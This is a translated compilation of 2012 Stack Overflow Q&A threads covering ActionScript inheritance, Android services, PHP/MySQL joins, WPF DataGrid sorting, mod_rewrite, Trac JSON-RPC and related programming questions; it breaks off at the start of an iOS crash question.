我的库中有一个名为 blueBox 的影片剪辑，它有一个相应的类 blueBox.as，它包含 blueBox() 构造函数、一些变量和一个处理 MOUSE_DOWN 事件的函数。我还有一个名为redBox 的movieClip，它需要一个与blueBox.as 几乎相同的类。是否可以复制 blueBox.as，只更改构造函数的名称和变量的值，而无需手动更改并将其保存为 redBox.as？目前手动操作并不是什么大问题，但是随着这个项目的发展，它将创建大量无意义的文件，所有文件都包含相同的信息，这似乎有点多余，欢迎任何见解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:30:20.970

似乎您只需要一个可以显示不同类型影片剪辑的 Box 类。一旦你有了那个类，你就可以创建它的多个实例，每个实例都有一个不同的影片剪辑（redBox、blueBox 等）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T15:30:32.750

[您可以通过使用继承](http://en.wikipedia.org/wiki/Inheritance_%28object-oriented_programming%29)来解决这个问题——您已经通过从`MovieClip`类扩展来使用这个概念。当你从一个类继承时，你是在借用它的实现，你可以向它添加更具体的功能，甚至覆盖一个超类的实现。

让我们看一个人为的例子：

鉴于有一个看起来像这样的类：

```
public class BlueBox extends MovieClip {

    private var color:uint;

    public function BlueBox() {
        this.color = 0x0000FF;
        this.addEventListener(MosueEvent.MOUSE_DOWN, handler)

        redraw();
    }

    // Mouse handler
    private function handler(e:MouseEvent):void {
        trace("DOWN!");
    }

    // some internal work
    private funciton redraw() {
        this.graphics.clear();
        this.graphics.beginFill(this.color);
        this.graphics.drawRect(10,10,50,50);
    }

    // other methods.
} 
```

并且您想创建一个非常相似的`RedBox`类，该类更改`color`为`0xFF0000`.

所以现在，`BlueBox`从`MovieClip`. 这意味着它是一个更“特定”的子类型。`MovieClip`它本身继承自`Sprite`，从该类中借用一些工作并扩展它自己。

事实上， a 有一个完整的继承层次结构`MovieClip`：

```
MovieClip -> Sprite -> DisplayObjectContainer -> InteractiveObject -> DisplayObject -> EventDispatcher  -> Object 
```

可以看到最基本的类型是`Object`，*几乎*所有的东西都在 ActionScript 中。“几乎”是这句话中的关键词。

可能最简单的实现方法是创建一个父类——或基类——两者都`BlueBox`将从`RedBox`中继承。这个新的父级将保存它们之间共有的代码，然后`RedBox`将`BlueBox`只包含它们之间不同的代码。

例如，让我们看看新的基类：

```
public class AbstractBox extends MovieClip {

    private var color:uint;

    public function AbstractBox(color:uint) {
        this.color = color;
        this.addEventListener(MosueEvent.MOUSE_DOWN, handler)
        redraw();
    }

    // Mouse handler
    private function handler(e:MouseEvent):void {
        trace("DOWN!");
    }

    // some internal work
    private funciton redraw() {
        this.graphics.clear();
        this.graphics.beginFill(this.color);
        this.graphics.drawRect(10,10,50,50);
    }

    // other methods.
} 
```

请注意，这个类`AbstractBox`包含与以前相同的大部分内容：它继承自`MovieClip`，它具有`handler`and`redraw`函数。真正唯一的区别是它的构造函数接受一个参数——它将用来绘制矩形的颜色`redraw`。

那么我们可以从中删除`BlueBox`什么？几乎所有内容，让我们看一下：

```
public class BlueBox extends AbstractBox {
    public function BlueBox(color:uint) {
        super(0x0000ff)
    }
} 
```

请注意，`BlueBox`现在 extends `AbstractBox`，并且它的大部分实现已被删除——或者更具体地说是从它的 super 借来的。在构造函数中，我们调用我们的“父”类构造函数，并给它应该使用的颜色。

现在要制作`RedBox`，我们所要做的就是改变颜色：

```
public class RedBox extends AbstractBox {
    public function BlueBox(color:uint) {
        super(0xff0000)
    }
} 
```

你去吧。两者共同的代码都存在于 中，`AbstractBox`然后只是该共同祖先的特定实现。`RedBox``BlueBox`

这几乎只是 OOP 的冰山一角，还有很多东西需要学习，而且——也许更重要的是——学习何时*不*使用继承来解决问题。但是，幸运的是，互联网上有很多资源可以帮助您获得这些技能。

* * *

根据您的评论，您可以尝试另一种方法，只要您从动作脚本（而不是从 Flash UI）中设置这些 DisplayObject 将使用静态方法，而不是使用子类来生成它们

```
public class AbstractBox extends MovieClip {

    public static function createBlueBox():AbstractBox
    {
        return new AbstractBox(0x0000FF);
    }

    public static function createRedBox():AbstractBox
    {
        return new AbstractBox(0xFF0000);
    }

    private var color:uint;

    public function AbstractBox(color:uint) {
        this.color = color;
        this.addEventListener(MosueEvent.MOUSE_DOWN, handler)
        redraw();
    }

    // Mouse handler
    private function handler(e:MouseEvent):void {
        trace("DOWN!");
    }

    // some internal work
    private funciton redraw() {
        this.graphics.clear();
        this.graphics.beginFill(this.color);
        this.graphics.drawRect(10,10,50,50);
    }

    // other methods.
} 
```

然后使用以下方法调用它们：

```
var blue:AbstractBox = AbstractBox.createBlueBox();
var red:AbstractBox = AbstractBox.createRedBox(); 
```

Flash UI 需要在您引用的类上具有继承链和无参数构造函数，因此如果您以这种方式链接剪辑，则必须生成子类。或者完全改变范例而不依赖于构造函数来设置/更改有问题的属性，而是在设置属性后让剪辑自己重绘。就像是：

```
public class AbstractBox extends MovieClip {

    private var _color:uint;

    public function get color():uint { return _color; }
    public function set color(val:uint) {
        _color = val;
        redraw();
    }

    public function AbstractBox() {
        this.addEventListener(MosueEvent.MOUSE_DOWN, handler)
        redraw();
    }

    // Mouse handler
    private function handler(e:MouseEvent):void {
        trace("DOWN!");
    }

    // some internal work
    private funciton redraw() {
        this.graphics.clear();
        this.graphics.beginFill(this.color);
        this.graphics.drawRect(10,10,50,50);
    }

    // other methods.
} 
```

请注意，设置该`.color`属性将导致 MovieClip 重绘自身。

```
redBox.color = 0xFF0000; // where redBox is an instance name of an AbstractBox in the Flash UI.
blueBox.color = 0x0000FF; 
```

# android - Aidl、android和解绑服务

> ID：11651610
> 
> 赞同：0
> 
> 时间：2012-07-25T14:06:39.390
> 
> 标签：android, aidl

有人可以向我解释为什么在调用*unbindService*后我仍然能够与服务通信吗？

流量：

```
bindService(new Intent(IService.class.getName()), conn, Context.BIND_AUTO_CREATE)
...
mService = IService.Stub.asInterface(service);
...
writeToOutput("Droping bombs from: " + mService.getPid());
...
unbindService(mCurConnection);  
... 
writeToOutput("Droping bombs from: " + mService.getPid()); // no exception - still returns good values
... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:33:37.020

也许该服务仍在执行一项任务。

在谷歌文档中，它指出调用 unbindService(Connection) 只是允许服务随时停止。它没有提到它是硬停止或强制停止。

来自谷歌文档： **“与应用程序服务断开连接。当服务重新启动时，您将不再接听电话，现在允许服务随时停止。”**

另一种可能性是您可能有另一个活动绑定到服务，只要您至少有一个绑定接口，服务就会保持活动状态。

如果您想发布有关您正在做什么的更多详细信息，我可能会提供更好的解决方案。

谢谢

# php - 寻找连接不良的表之间的链接（不确定公式）

> ID：11651612
> 
> 赞同：1
> 
> 时间：2012-07-25T14:06:46.703
> 
> 标签：php, mysql

：

我不得不说我远不是 PHP 和 MySQL 方面的专家，所以我不知道如何提出我的问题。这解释了标题的模糊性。我有两张写得不好但不允许更改的表。他们唯一共享的是一个名为 url 的字段。它们没有主键或索引。这是它们的结构：

```
Shareholder       |||   tags

url1 |  value1      |||      url1 | tag1 tag2 tag350 tag 400

url2  | value2      |||     url2 | tag8 tag400 tag350

url3  | value1      |||   url3 | tag2 tag1

url4 | value1       |||    url4 | tag5 tag 600

url5 | value2        |||   url5  | tag 60 tag8 
```

从这些表中，我必须找到按股东划分的平均标签数，例如，股东是 value1、value2。
例如，预期的输出是股东1（价值1）

使用临时数组通过 url 计算标签的数量相当容易。然后我认为我必须将这些价值添加到相关股东中，但我迷路了。我不知道如何解决这个问题，甚至不知道如何形式化这种类型的 PHP/SQL 问题。我做了一个自然失败的尝试。尽管如此，我还是将其粘贴在下面。有人能帮我吗？

```
$sqlprim = "SELECT DISTINCT content FROM shareholder";
$deletedtermsprim = mysql_query ($sqlprim);

while ($rowprim = mysql_fetch_array($deletedtermsprim))
{
$tagsbyshareholder = array();
foreach ($rowprim as $keys1 => $values1)
{
    $sql = "SELECT url FROM shareholder WHERE content like \"$values1\"";
    $output1 = mysql_query($sql);
    $deletedterms = array("tags", "[", "]", ":");
while ($row = mysql_fetch_array($output1)) {
    foreach ($row as $columnName => $columnUrl) {
        $sql2 = "SELECT content
FROM tags WHERE url like\"$columnUrl\"";
$deletedterms = mysql_query($sql2);
while ($row2 = mysql_fetch_array($deletedterms)) 
{
    foreach ($row2 as $keys2 => $columntags); 
    {
        $preparedtags = str_replace($deletedterms, "", $columntags);
        $temporaryarray = explode(" ", $preparedtags);
        $temporaryarray = array_values(array_filter($temporaryarray));
        $countedtagsbyurl = count($temporaryarray);
        array_push($tagsbyshareholder, $countedtagsbyurl);
        }
}
}
}

}
foreach ($tagsbyshareholder as $countitems => $numberoftagsbyshareholder);
            echo $values1\. ";". $numberoftagsbyshareholder;
            echo "<br />";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:54:04.393

这可能会帮助您解决问题的 SQL 部分，我认为它将简化您在 PHP 中必须做的事情。您的数据库可能没有正确规范化或有 PK 等，但您仍然可以在两个表上进行连接。

例如，这个查询：

```
SELECT s.url, s.content, t.content 
FROM shareholder s
INNER JOIN tags t 
ON s.url = t.url 
```

返回

```
url1    value1  tag1 tag2 tag350 tag400
url2    value2  tag8 tag400 tag350
url3    value3  tag2 tag1
url4    value4  tag5 tag600
url5    value5  tag60 tag8 
```

在您的样本数据上。这种使用内部连接将两个表拉到一起的查询肯定有助于避免 PHP 中的大量嵌入式循环。这似乎特别重要，因为您正在尝试为外部循环的每次重复运行选择查询。

# iphone - 如何解析 XML 文件

> ID：11651622
> 
> 赞同：-2
> 
> 时间：2012-07-25T14:07:06.773
> 
> 标签：iphone, ios, parsing

我是 Iphone App 开发的新手。我正在我的应用程序中实现 Google Weather API。我使用教程代码，它使用 NSXMLParser 进行解析。我在以下方法中删除了教程代码。我使用这个谷歌 API [http://www.google.com/ig/api?weather=nabha](http://www.google.com/ig/api?weather=nabha)

现在我做什么来获得输出。当前温度、高温、低温等

任何提示和解决方案都非常感谢。

谢谢

我的方法是。

```
- (void)parser:(NSXMLParser *)parser didStartElement:(NSString *)elementName 
  namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qualifiedName 
attributes:(NSDictionary *)attributeDict {

NSLog(@"Processing Element: %@", elementName);

}

- (void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string { 

}

- (void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName 
  namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName {

}

    2012-07-25 19:20:14.654 XML[4555:f803] Processing Element: xml_api_reply
Current language:  auto; currently objective-c
Processing Element: weather
Processing Element: forecast_information
Processing Element: city
Processing Element: postal_code
Processing Element: latitude_e6
Processing Element: longitude_e6
Processing Element: forecast_date
Processing Element: current_date_time
Processing Element: unit_system
Processing Element: current_conditions
Processing Element: condition
Processing Element: temp_f
Processing Element: temp_c
Processing Element: humidity
Processing Element: icon
Processing Element: wind_condition

   etc......
  2012-07-25 19:20:44.042 XML[4555:f803] No Errors 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:14:52.973

我会推荐[RaptureXML](https://github.com/ZaBlanc/RaptureXML)来解析短 XML 片段。获取当前条件温度看起来像这样（未经测试）：

```
RXMLElement *root = [RXMLElement elementFromURL:[NSURL URLWithString:@"http://www.google.com/ig/api?weather=nabha"]];

RXMLElement *currentConditions = [root child:@"current_conditions"];
RXMLElement *tempC= [currentConditions child:@"temp_c"];
NSLog(@"temperature (C): %@", [tempC attribute:@"data"]); 
```

# .net - 使用绑定数据和转换器对 datagrid 列进行排序

> ID：11651624
> 
> 赞同：6
> 
> 时间：2012-07-25T14:07:12.810
> 
> 标签：.net, wpf, xaml, mvvm

我正在尝试对数据网格中的数据进行排序，但是当我单击与转换器绑定的列的标题时，没有任何反应。我使用 MVVM 模式。下面附上示例。在示例中，网格显示了显示人员类型的列 (Type)，因此我使用转换器（TypeValueConverter 类）。当我使用这个转换器时，网格不会对列类型进行排序。

```
<Window x:Class="GridSort.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:my="clr-namespace:GridSort"
        Title="MainWindow" Height="350" Width="525">
    <Grid>
        <DataGrid ItemsSource="{Binding People}" AutoGenerateColumns="False">
            <DataGrid.Resources>
                <my:TypeValueConverter x:Key="typeConverter" />
            </DataGrid.Resources>
            <DataGrid.Columns>
                <DataGridTextColumn Binding="{Binding FirstName}" Header="FirstName" />
                <DataGridTextColumn Binding="{Binding Surname}" Header="Surname" />
                <DataGridTextColumn Binding="{Binding Converter={StaticResource ResourceKey=typeConverter}}" Header="Type" />
            </DataGrid.Columns>
        </DataGrid>
    </Grid>
</Window> 
```

```
public class ViewModel
{
    private ICollection<Person> people;
    public ICollection<Person> People
    {
        get
        {
            if (this.people == null)
            {
                this.people = new List<Person>();
                this.people.Add(new Student() { FirstName = "Charles", Surname = "Simons" });
                this.people.Add(new Student() { FirstName = "Jake", Surname = "Baron" });
                this.people.Add(new Teacher() { FirstName = "John", Surname = "Jackson" });
                this.people.Add(new Student() { FirstName = "Patricia", Surname = "Phillips" });
                this.people.Add(new Student() { FirstName = "Martin", Surname = "Weber" });
            }

            return this.people;
        }
    }
}

public class TypeValueConverter : IValueConverter
    {
        public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
        {
            if (value == null)
            {
                return DependencyProperty.UnsetValue;
            }

            return value.GetType().Name;
        }

        public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
        {
            throw new NotImplementedException();
        }
    }

public abstract class Person
    {
        public string FirstName
        {
            get;
            set;
        }

        public string Surname
        {
            get;
            set;
        }
    }

    public class Student : Person
    {
    }

    public class Teacher : Person
    {
    } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-26T08:20:39.367

我自己解决了这个问题:)

我为带有附加属性 UseBindingToSort 的网格创建了新行为。当我将此属性设置为 true 时，将订阅网格上的事件排序。在网格触发事件排序后，我将自定义比较器与绑定中定义的 IValueConverter 一起使用。解决方案如下：

改变视图

```
<DataGrid ItemsSource="{Binding People}" AutoGenerateColumns="False"  my:GridSortingBehavior.UseBindingToSort="True"> 
```

附加属性的新行为：

```
public static class GridSortingBehavior
    {
        public static readonly DependencyProperty UseBindingToSortProperty = DependencyProperty.RegisterAttached("UseBindingToSort", typeof(bool), typeof(GridSortingBehavior), new PropertyMetadata(new PropertyChangedCallback(GridSortPropertyChanged)));

        public static void SetUseBindingToSort(DependencyObject element, bool value)
        {
            element.SetValue(UseBindingToSortProperty, value);
        }

        private static void GridSortPropertyChanged(DependencyObject elem, DependencyPropertyChangedEventArgs e)
        {
            DataGrid grid = elem as DataGrid;
            if (grid != null){
                if ((bool)e.NewValue)
                {
                    grid.Sorting += new DataGridSortingEventHandler(grid_Sorting);
                }
                else
                {
                    grid.Sorting -= new DataGridSortingEventHandler(grid_Sorting);
                }
            }
        }

        static void grid_Sorting(object sender, DataGridSortingEventArgs e)
        {
            DataGridTextColumn clm = e.Column as DataGridTextColumn;
            if (clm != null)
            {
                DataGrid grid = ((DataGrid)sender);
                IValueConverter converter = null;
                if (clm.Binding != null)
                {
                    Binding binding = clm.Binding as Binding;
                    if (binding.Converter != null)
                    {
                        converter = binding.Converter;
                    }
                }

                if (converter != null)
                {
                    e.Handled = true;
                    ListSortDirection direction = (clm.SortDirection != ListSortDirection.Ascending) ? ListSortDirection.Ascending : ListSortDirection.Descending;
                    clm.SortDirection = direction;
                    ListCollectionView lcv = (ListCollectionView)CollectionViewSource.GetDefaultView(grid.ItemsSource);
                    lcv.CustomSort = new ComparerWithComparer(converter, direction);
                }
            }
        } 
```

最后是我的自定义比较器：

```
class ComparerWithComparer : IComparer
    {
        private System.Windows.Data.IValueConverter converter;
        private System.ComponentModel.ListSortDirection direction;

        public ComparerWithComparer(System.Windows.Data.IValueConverter converter, System.ComponentModel.ListSortDirection direction)
        {
            this.converter = converter;
            this.direction = direction;
        }

        public int Compare(object x, object y)
        {
            object transx = this.converter.Convert(x, typeof(string), null, System.Threading.Thread.CurrentThread.CurrentCulture);
            object transy = this.converter.Convert(y, typeof(string), null, System.Threading.Thread.CurrentThread.CurrentCulture);
            if (direction== System.ComponentModel.ListSortDirection.Ascending){
                return Comparer.Default.Compare(transx, transy);
            }
            else
            {
                return Comparer.Default.Compare(transx, transy) * (-1);
            }
        }
    } 
```

就这样。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T15:34:17.277

您正在使用 MVVM。如果您无法将属性添加`Type`到您的`Person`课程

```
public abstract class Person
{
    public string FirstName { get; set; }

    public string Surname { get; set; }

    public string Type
    {
        get { return this.GetType().Name; }
    }
} 
```

你应该创建一个`PersonViewModel`

```
public class PersonViewModel
{
    public Person Person { get; private set; }

    public PersonViewModel(Person person)
    {
        this.Person = person;
    }

    public string Type
    {
        get { return this.Person.GetType().Name; }
    }
} 
```

调整您的人物收藏

```
private ICollection<PersonViewModel> people;
public ICollection<PersonViewModel> People
{
    get
    {
        if (this.people == null)
        {
            this.people = new List<PersonViewModel>();
            this.people.Add(new PersonViewModel(new Student { FirstName = "Charles", Surname = "Simons" }));
            this.people.Add(new PersonViewModel(new Student { FirstName = "Jake", Surname = "Baron" }));
            this.people.Add(new PersonViewModel(new Teacher { FirstName = "John", Surname = "Jackson" }));
            this.people.Add(new PersonViewModel(new Student { FirstName = "Patricia", Surname = "Phillips" }));
            this.people.Add(new PersonViewModel(new Student { FirstName = "Martin", Surname = "Weber" }));
        }
        return this.people;
    }
} 
```

并使用此 XAML

```
<DataGrid.Columns>
    <DataGridTextColumn Binding="{Binding Person.FirstName}" Header="FirstName" />
    <DataGridTextColumn Binding="{Binding Person.Surname}" Header="Surname" />
    <DataGridTextColumn Binding="{Binding Type}" Header="Type" />
</DataGrid.Columns> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-07-16T13:59:41.750

我使用了 Juptin 的解决方案。但在我的情况下，我使用 ConverterParameter。所以我将它添加到他的代码中：

```
class ComparerWithComparer : IComparer
{
    private IValueConverter converter;
    private ListSortDirection direction;
    private object parameter;

    public ComparerWithComparer(IValueConverter converter, ListSortDirection direction, object parameter)
    {
        this.converter = converter;
        this.direction = direction;
        this.parameter = parameter;
    }

    public int Compare(object x, object y)
    {
        object transx = converter.Convert(x, typeof(string), parameter, System.Threading.Thread.CurrentThread.CurrentCulture);
        object transy = converter.Convert(y, typeof(string), parameter, System.Threading.Thread.CurrentThread.CurrentCulture);
        if (direction == ListSortDirection.Ascending)
        {
            return Comparer.Default.Compare(transx, transy);
        }
        return Comparer.Default.Compare(transx, transy) * (-1);
    }
}
static void grid_Sorting(object sender, DataGridSortingEventArgs e)
{
    DataGridTextColumn column = e.Column as DataGridTextColumn;
    if (column != null)
    {
        DataGrid grid = ((DataGrid)sender);
        IValueConverter converter = null;
        object parameter = null;
        if (column.Binding != null)
        {
            Binding binding = column.Binding as Binding;
            if (binding.Converter != null)
            {
                converter = binding.Converter;
            }
            parameter = binding.ConverterParameter;
        }

        if (converter != null)
        {
            e.Handled = true;
            ListSortDirection direction = (column.SortDirection != ListSortDirection.Ascending) ? ListSortDirection.Ascending : ListSortDirection.Descending;
            column.SortDirection = direction;
            var listCollectionView = (ListCollectionView)CollectionViewSource.GetDefaultView(grid.ItemsSource);
            listCollectionView.CustomSort = new ComparerWithComparer(converter, direction,parameter);
        }
    }
} 
```

# html - 未引用的字符集是否有效？

> ID：11651630
> 
> 赞同：0
> 
> 时间：2012-07-25T14:07:21.130
> 
> 标签：html, character-encoding, meta-tags, quotes

我正在检查新的[JSBin](http://jsbin.com)，并注意到默认的 HTML 包括：`<meta charset=utf-8 />`. 注意编码`utf-8`是如何不被引用的。我想知道这只是一个错误还是有效的 HTML。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:08:43.430

该值不包含任何需要引用该值的字符。这是有效的。

# c++ - 如何在 C++ 中测试公钥/私钥对？

> ID：11651632
> 
> 赞同：1
> 
> 时间：2012-07-25T14:07:30.170
> 
> 标签：c++, c, openssl, ssl-certificate, x509certificate

有没有办法验证给定的私钥与给定的公钥匹配？我想用 C++ 检查它们

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T18:45:06.893

这取决于使用密钥的公钥算法，以及这些密钥的编码方式。例如，RSA 公钥由两个参数“n”和“e”组成，而私钥由这些参数加上“d”组成，可能还有“p”和“q”。所有这些参数都是大整数，通常使用一些大整数库的内部形式来表示。因此，要比较公钥和私钥，您只需要检查“n”和“e”是否匹配。根据使用的库和系统，您甚至可以忽略“e”，因为它可能是一个常数。

使用可能类似于以下内容的 OpenSSL：

```
RSA *pubkey = PEM_read_RSA_PUBKEY(...);
RSA *privkey = PEM_read_RSAPrivateKey(...);

if (!BN_cmp(pubkey->n, privkey->n)) {
    // same modulus, so the keys match 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:09:14.147

查看[http://www.cryptopp.com/](http://www.cryptopp.com/)，它具有检查密钥对的实用程序。

作为一般规则，私钥应该能够解密使用公钥加密的数据。这证明给定的密钥对是有效的。

# .htaccess - 使 Mod_rewrite 的 RewriteCond 相对

> ID：11651638
> 
> 赞同：2
> 
> 时间：2012-07-25T14:07:40.400
> 
> 标签：.htaccess, mod-rewrite

再会，

我对此进行了很多搜索，但无法得到明确的答案。

我有一个目录设置：

/var/www/html/alpha/beta/cache/delta

我想要这样的网址：

```
http://localhost/alpha/beta/delta 
```

查看 cache/，查看 delta 目录是否存在，并将用户转发到那里。另一方面，如果 delta 目录（或包含的 index.html）不存在，则将用户转发到 localhost/alpha/beta/index.php

这是我的 htaccess 文件，它位于 alpha/beta/

```
RewriteBase /alpha/beta/

# this next line is included because localhost/alpha/beta/ was forwarding to cache/
# there is probably a better way
RewriteCond $1 \w{1}
RewriteCond %{DOCUMENT_ROOT}/alpha/beta/cache/$1 -d
RewriteRule ^(.*)$ cache/$1 [L]

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^.*$ index.php 
```

这有效（几乎*），但我不想要这个。我想要相对路径，这样使用该软件的人就不必修改包含的 .htaccess 文件。

我认为 RewriteBase 会影响 RewriteCond 但它不会。如果我删除 %{DOCUMENT_ROOT} 那么条件显然会尝试与文件系统/目录上的 alpha/beta/cache/delta 匹配。使用

```
RewriteCond cache/$1 -d 
```

也不检查相对目录。

我不能在条件中使用 {REQUEST_URI} 因为那时我得到 /var/www/html/alpha/beta/delta/cache/delta/

如果不包括请求，我无法找到隔离当前子目录以在条件中使用的方法。

请帮忙。我已经走到了尽头。

**更新：**如果我使用

```
RewriteCond cache/$1/index.html -F 
```

它有效，但重写日志条目非常大。似乎它做了很多冗余检查来完成结果，我不确定这是一个好的解决方案。

*   如果我使用 alpha/beta/delta/ 一切都很好。但是，如果我省略最后的正斜杠，地址将更改为 alpha/beta/cache/delta/。我想使用该目录，但我不想更改 url。

# asp.net-mvc - ASP.NET MVC 3 - Windows 用户的授权很慢，我们可以加快速度吗？

> ID：11651639
> 
> 赞同：2
> 
> 时间：2012-07-25T14:07:41.317
> 
> 标签：asp.net-mvc, asp.net-mvc-3, authorization, windows-authentication

我们的 ASP.NET MVC 3 Intranet 应用程序使用 Windows 用户身份验证，并且还要求用户具有特定角色才能访问管理部分（授权）。虽然所有这些都有效，但我们发现检查用户的角色成员身份确实很慢（约 20 秒）。我们使用`User.IsInRole`方法或`AuthorizeAttribute`。即使我们检查本地管理员组（'BUILTIN\Administrators'）而不是 AD 组，它仍然很慢。

现在，为了加快用户授权，我们可以遵循一些推荐的方案吗？例如在数据库中缓存用户的授权状态是否常见？自从授权针对本地组（“管理员”）这么慢以来，是否存在更根本的问题？

**编辑：**

Web 服务器在 Windows 2008 R2 SP1 x64、.NET 4.0、IIS 7.5、4 GB RAM 上运行。但是，我在我的开发机器上对用户角色成员身份进行了相同的延迟查询，因此看起来问题与运行应用程序的机器无关。我认为 DBMS 应该无关紧要，因为时间花在查询用户是否是“BUILTIN\Administrators”的成员（为了简化问题，我只是检查这个本地组）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T19:23:20.823

在引擎盖下 ASP.NET MVC Windows 用户身份验证与 Web 窗体所做的事情相同。我不知道将框架 MembershipProvider 和 RoleProvider 与 Web 表单或 MVC 一起使用时会出现任何性能问题。为了调试它，我将创建最简单的 Web 窗体（和 MVC）项目，并找出所有时间都花在了哪里。可能是您的 AD 服务器速度较慢，或者第一次身份验证尝试超时。

# jquery - 使用 JQuery AJAX 时跟踪 JSON RPC 问题

> ID：11651649
> 
> 赞同：0
> 
> 时间：2012-07-25T14:07:59.267
> 
> 标签：jquery, trac, json-rpc

我正在尝试使用 trac XMLRPCPlugin 使用我自己的方法通过 JSON RPC 访问一些数据，该方法“插入”到服务器端的扩展点之一和客户端的 JQuery AJAX 请求中。我可以使用 Firefox 海报扩展很好地访问数据，但是使用 JQuery ajax 请求会给出错误消息。我得到的错误信息是：

```
Trac[web_ui] DEBUG: RPC incoming request of content type 'application/json' dispatched 
to <tracrpc.json_rpc.JsonRpcProtocol object at 0x03CA51F0>
Trac[web_ui] DEBUG: RPC(JSON-RPC) call by 'PaulWilding'
Trac[json_rpc] ERROR: RPC(json) decode error 
Traceback (most recent call last):
  File "build\bdist.win32\egg\tracrpc\json_rpc.py", line 148, in parse_rpc_request
    data = json.load(req, cls=TracRpcJSONDecoder)
  File "C:\Python27\Lib\json\__init__.py", line 278, in load
    **kw)
  File "C:\Python27\Lib\json\__init__.py", line 339, in loads
    return cls(encoding=encoding, **kw).decode(s)
  File "build\bdist.win32\egg\tracrpc\json_rpc.py", line 99, in decode
    obj = json.JSONDecoder.decode(self, obj, *args, **kwargs)
  File "C:\Python27\Lib\json\decoder.py", line 366, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "C:\Python27\Lib\json\decoder.py", line 384, in raw_decode
    raise ValueError("No JSON object could be decoded")
ValueError: No JSON object could be decoded
Trac[web_ui] ERROR: RPC(JSON-RPC) Error
Traceback (most recent call last):
  File "build\bdist.win32\egg\tracrpc\web_ui.py", line 143, in _rpc_process
    rpcreq = req.rpc = protocol.parse_rpc_request(req, content_type)
  File "build\bdist.win32\egg\tracrpc\json_rpc.py", line 162, in parse_rpc_request
    raise JsonProtocolException(e, -32700)
JsonProtocolException: No JSON object could be decoded
Trac[json_rpc] DEBUG: RPC(json) encoded response: {"error": {"message": "JsonProtocolException details : No JSON object could be decoded", "code": -32700, "name": "JSONRPCError"}, "result": null, "id": null} 
```

JQuery 请求是：

```
 url: "http://localhost/Projects/jsonrpc",
   contentType: "application/json",
   dataType: "jsonp",
   data: {"method": "breq.getBreqs"},
   type: 'POST',
   success: function (repsonse) {
          alert("success");
   },
   error: function (jqXHR, textStatus, errorThrown) {
          alert("Error: " + textStatus);
   } 
```

我通过 Poster 处理的请求只是“{“method”：“breq.getBreqs”}”，内容设置为 application/json，URL 与上面相同。

当与 PHP 代理一起使用时，我已经阅读了一些关于此问题的帖子，并尝试将请求记录在 trac rpc 插件的 parse_rpc_request 中，但这只会为工作和非工作请求返回相同的“”字符串。

由于 Javascript 的同源策略，我认为这不是问题，因为请求是针对我机器上的 trac 测试平台的。但是，一旦将插件部署到仍在主网络内的服务器上，这将成为一个问题，如果是这样，我应该如何处理它？

如果问题与同源策略无关，有人知道是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T15:20:49.980

问题可能出在您实际发送的参数中：

```
data: {"method": "breq.getBreqs"} 
```

尝试此处描述的解决方案： [Jquery Ajax Posting json to webservice](https://stackoverflow.com/questions/6323338/jquery-ajax-posting-json-to-webservice)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-26T19:27:00.727

您的调用将对输入进行 URL 编码，这不是您想要的 JSON-RPC。您希望请求正文是没有添加字符或信息的 JSON 字符串。

这是您的代码片段的新版本，可以从浏览器 javascript 控制台正常加载，但请注意我的示例调用`system.listMethods`（而不是您的自定义方法），以便它适用于任何 Trac RPC 安装：

```
$.ajax({
   url: "http://localhost/trac/rpc",
   contentType: "application/json",
   dataType: "text",
   data: JSON.stringify({method: "system.listMethods", id: 42}),
   type: 'POST',
   success: function (response) {
       incoming = JSON.parse(response)
       alert("Result ID " + incoming["id"] + ": " + incoming["result"]);
   },
   error: function (jqXHR, textStatus, errorThrown) {
       alert("Error: " + textStatus);
   }
}); 
```

除非已分配权限，否则请使用`/login/rpc`URL 。`anonymous``XML_RPC`

# android - 更改 ListPreference 样式

> ID：11651650
> 
> 赞同：5
> 
> 时间：2012-07-25T14:08:01.463
> 
> 标签：android, android-layout, android-widget, android-theme

我想`ListPreference`通过创建一个新的`style`.

我`CheckBoxPreference`通过继承`Widget.CompoundButton.CheckBox`和设置一个新的`android:button`来做到这一点，但我不知道如何在 a 上做到这一点`ListPreference`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T11:38:22.150

您可以使用 WidgetLayout 属性在首选项中添加图标。

例子：

```
<EditTextPreference
    android:defaultValue=""
    android:dialogTitle="@string/mode_name"
    android:key="mode_name"
    android:order="0"
    android:summary=""
    android:title="@string/mode_name"
    android:widgetLayout="@layout/mode_item_preference"
     /> 
```

和 mode_item_preference.xml

```
<?xml version="1.0" encoding="utf-8"?>
<ImageView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/imageView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:contentDescription="@string/app_name"
    android:focusable="false"
    android:src="@drawable/delete" /> 
```

# iphone - 应用程序崩溃 - Webcore - iOS 5.1.1

> ID：11651651
> 
> 赞同：3
> 
> 时间：2012-07-25T14:08:02.883
